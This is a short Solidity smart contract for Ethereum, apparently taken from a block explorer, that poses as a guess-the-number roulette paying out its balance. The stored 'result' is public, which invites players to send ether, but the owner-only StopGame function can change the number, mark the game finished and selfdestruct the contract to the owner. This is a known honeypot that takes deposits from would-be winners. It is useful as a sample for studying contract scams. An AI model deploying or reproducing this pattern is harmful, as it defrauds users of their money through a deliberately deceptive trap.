
//Address: 0xd87eaad7afb256c69526a490f402a658f12246fd
//Contract name: R
//Balance: 0 Ether
//Verification Date: 6/18/2018
//Transacion Count: 2

// CODE STARTS HERE

pragma solidity ^0.4.20;

contract R
{

    uint8 public result = 0;

    bool public finished = false;

    address public rouletteOwner;

    function Play(uint8 _number)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(result == _number && msg.value>0.001 ether && !finished)
        {
            msg.sender.transfer(this.balance);
            GiftHasBeenSent();
        }
    }

    function StartRoulette(uint8 _number)
    public
    payable
    {
        if(result==0)
        {
            result = _number;
            rouletteOwner = msg.sender;
        }
    }

    function StopGame(uint8 _number)
    public
    payable
    {
        require(msg.sender == rouletteOwner);
        GiftHasBeenSent();
        result = _number;
        if (msg.value>0.001 ether){
            selfdestruct(rouletteOwner);
        }
    }

    function GiftHasBeenSent()
    private
    {
        finished = true;
    }

    function() public payable{}
}
